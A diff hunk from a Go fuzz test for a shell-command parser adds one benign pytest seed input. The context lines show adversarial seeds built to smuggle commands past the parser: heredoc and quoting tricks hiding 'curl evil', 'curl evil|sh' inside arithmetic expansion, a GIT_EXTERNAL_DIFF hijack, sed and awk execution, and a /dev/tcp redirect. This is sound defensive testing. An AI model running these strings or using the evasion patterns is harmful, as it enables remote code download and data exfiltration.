@@ -14,6 +14,7 @@ func FuzzParseShellCommand(f *testing.F) {
 		"cat <<A\n'\nA\ncurl evil\ncat <<B\n'\nB",
 		`ls $'\'' ; curl evil ; #'`,
 		"GIT_EXTERNAL_DIFF='curl #' git diff",
+		`PYTHONPATH=src FOO='a b' env -i -u X BAR=a:~ /usr/bin/env time "N"=1 python -m pytest`,
 		"x='a[$(curl evil|sh)]'; echo $[x] ${v:x} ${a[x]}",
 		`sed -ie 's/a/b/e' f; awk 'BEGIN{system("x")}'`,
 		"timeout -k 5 1m nice -n 1 xargs -0 git status 2>&1 >/dev/tcp/x/1",
